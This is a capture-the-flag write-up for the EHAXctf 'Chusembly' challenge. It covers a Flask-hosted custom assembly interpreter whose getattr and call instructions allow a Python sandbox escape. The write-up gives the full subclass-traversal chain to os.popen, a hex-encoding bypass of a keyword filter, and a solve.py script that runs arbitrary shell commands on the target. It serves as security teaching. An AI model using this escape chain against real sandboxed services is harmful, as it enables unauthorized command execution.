# Chusembly — EHAXctf Misc

**Category:** Misc/Web
**Description:** "I've created Chusembly - a revolutionary new programming language that's totally secure! It has registers, a stack, and everything a real language needs. I even added a safety check so you can't do anything dangerous. The flag is sitting right there in flag.txt, but good luck reading it with my restricted instruction set!"
**URL:** `http://chall.ehax.in:6969/`
**Flag:** `EH4X{chusembly_a1n7_7h47_7uffff_br0}`

---

## Initial Analysis

### Web Interface

Flask app with a POST form at `/run`. Accepts code in the "Chusembly" language and returns output in a `<pre>` tag.

### Hidden Documentation

```
GET /docs -> Full language documentation
GET /docs/call -> Per-instruction details
```

The `/docs` endpoint is not linked from the main page but reveals critical information.

### Available Instructions

| Instruction | Syntax | Description |
|-------------|--------|-------------|
| LD | `LD reg value` | Load integer, hex (0x...) → bytes.fromhex().decode(), or string |
| PUSH | `PUSH reg` | Push register to stack |
| POP | `POP reg` | Pop stack to register |
| PEEK | `PEEK reg` | Peek top of stack |
| ADD | `ADD reg1 reg2` | Add ints or concatenate strings, result in reg1 |
| MOV | `MOV src dst` | Copy src → dst |
| DEL | `DEL reg` | Set register to None |
| CMP | `CMP reg1 reg2` | Compare, result (0/1) in **E** |
| IDX | `IDX src dst` | `dst = src[A]` (A must be int) |
| PROP | `PROP name reg` | `E = getattr(reg, name)` |
| CALL | `CALL reg` | `E = reg(A, B)` (args optional depending on None) |
| STDOUT | `STDOUT reg` | Print register value |
| END | `END` | Stop execution |

### Register E (key to the exploit)

**Discovered via `/docs`:** There is a 5th register **E** ("Special result register") that stores results from PROP, CALL, CMP and IDX. Without this documentation, PROP/CALL/IDX appear broken because results go to an undocumented register.

### Safety Check

```python
# Only blocks the word "flag" (lowercase, case-sensitive) in the code
if "flag" in code:
    return "Unsafe code detected"
```

Does not block: `FLAG`, `fla`, `g.txt`, `open`, `exec`, `eval`, `__class__`, `__globals__`, or anything else.

## Vulnerability

**Python class hierarchy traversal via PROP (getattr) + CALL:**

The interpreter allows:
1. **PROP** executes real Python `getattr()` on any object
2. **CALL** executes any Python callable with arguments from registers A and B
3. **LD with `0x` prefix** does `bytes.fromhex(value[2:]).decode('utf-8')` — allows building arbitrary strings without the safety check detecting "flag"

This enables the classic Python sandbox escape chain:
```
str.__class__.__bases__[0].__subclasses__()[138]  # os._wrap_close
    .__init__.__globals__['popen']('cat flag.txt').read()
```

## Solution Steps

### Step 1: Discover /docs and register E

```
GET http://chall.ehax.in:6969/docs
```

The documentation reveals:
- Register **E** as the result destination for PROP, CALL, IDX, and CMP
- PROP uses real Python `getattr()`
- CALL executes callables with args from A/B
- Correct syntax: `PROP property_name register` (first arg is literal, not a register)

### Step 2: Verify access to Python's class hierarchy

```
LD A hello
PROP __class__ A    -> E = <class 'str'>
PROP __bases__ E    -> E = (<class 'object'>,)
```

Unrestricted `getattr()` = full access to Python's object model.

### Step 3: Find os._wrap_close

```
$ Get object.__subclasses__()
LD A hello
PROP __class__ A
MOV E B
PROP __bases__ B
MOV E B
LD A 0
IDX B C                 $ C = object class
PROP __subclasses__ C   $ E = subclasses method
MOV E D
DEL A
DEL B
CALL D                  $ E = [list of all subclasses]
```

Scanning the list: `os._wrap_close` is at index **138**.

### Step 4: Get os.popen

```
$ E holds the subclasses list
MOV E C
LD A 138
IDX C D                 $ D = os._wrap_close
PROP __init__ D         $ E = __init__ method
MOV E D
PROP __globals__ D      $ E = os module globals dict
MOV E C
PROP __getitem__ C      $ E = dict.__getitem__ method
MOV E D
LD A popen
DEL B
CALL D                  $ E = os.popen function
```

### Step 5: Execute command with filter bypass

```python
# "cat flag.txt" in hex = 0x63617420666c61672e747874
# The hex code does NOT contain the word "flag" in plaintext
```

```
MOV E C
LD A 0x63617420666c61672e747874   $ "cat flag.txt" via hex
DEL B
CALL C                             $ E = popen("cat flag.txt")
MOV E D
PROP read D                        $ E = read method
MOV E D
DEL A
DEL B
CALL D                             $ E = file contents
STDOUT E                           $ Print flag
```

### Step 6: Output

```
EH4X{chusembly_a1n7_7h47_7uffff_br0}
```

## Full Exploit (Chusembly code)

```
LD A hello
PROP __class__ A
MOV E B
PROP __bases__ B
MOV E B
LD A 0
IDX B C
PROP __subclasses__ C
MOV E D
DEL A
DEL B
CALL D
MOV E C
LD A 138
IDX C D
PROP __init__ D
MOV E D
PROP __globals__ D
MOV E C
PROP __getitem__ C
MOV E D
LD A popen
DEL B
CALL D
MOV E C
LD A 0x63617420666c61672e747874
DEL B
CALL C
MOV E D
PROP read D
MOV E D
DEL A
DEL B
CALL D
STDOUT E
```

## Exploit Script (solve.py)

```python
#!/usr/bin/env python3
"""
EHAXctf - Chusembly (Misc/Web)
Python class hierarchy traversal via custom assembly interpreter
"""
import requests, re, binascii, sys

URL = "http://chall.ehax.in:6969/run"

def run(code):
    r = requests.post(URL, data={"code": code})
    m = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    return m.group(1).strip() if m else "(no output)"

def exploit(cmd="cat flag.txt"):
    hex_cmd = "0x" + binascii.hexlify(cmd.encode()).decode()
    code = f"""LD A hello
PROP __class__ A
MOV E B
PROP __bases__ B
MOV E B
LD A 0
IDX B C
PROP __subclasses__ C
MOV E D
DEL A
DEL B
CALL D
MOV E C
LD A 138
IDX C D
PROP __init__ D
MOV E D
PROP __globals__ D
MOV E C
PROP __getitem__ C
MOV E D
LD A popen
DEL B
CALL D
MOV E C
LD A {hex_cmd}
DEL B
CALL C
MOV E D
PROP read D
MOV E D
DEL A
DEL B
CALL D
STDOUT E"""
    return run(code)

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat flag.txt"
    print(exploit(cmd))
```

## Flag

```
EH4X{chusembly_a1n7_7h47_7uffff_br0}
```

## Key Lessons

1. **Always look for hidden documentation**: `/docs` was not linked but contained critical info — register E, correct PROP and CALL syntax, and working examples. Without this, PROP/CALL appeared broken.

2. **Classic Python sandbox escape**: Unrestricted `getattr()` + callable execution = full access. The `str.__class__.__bases__[0].__subclasses__()` chain is the standard technique for escaping Python sandboxes (SSTI, custom interpreters, etc.).

3. **Trivial safety check**: Only blocking "flag" in the code is insufficient. Hex encoding (`0x636174...` = "cat flag.txt") completely bypasses the check without the string "flag" appearing in the code.

4. **DEL to control CALL arguments**: `CALL reg` passes A and B as arguments if they are not None. To call functions with no arguments (like `read()`), you must `DEL A` and `DEL B` first.

5. **getattr() on dicts**: To access dictionary keys via `getattr`, you must get `__getitem__` as a method and then `CALL` with the key as argument. `getattr(dict, 'key')` does not work for dict keys.

## Files

```
chusembly/
├── solve.py         # Main exploit
├── chuse.py         # HTTP helper
├── flag.txt         # Captured flag
└── solution.md      # This writeup
```
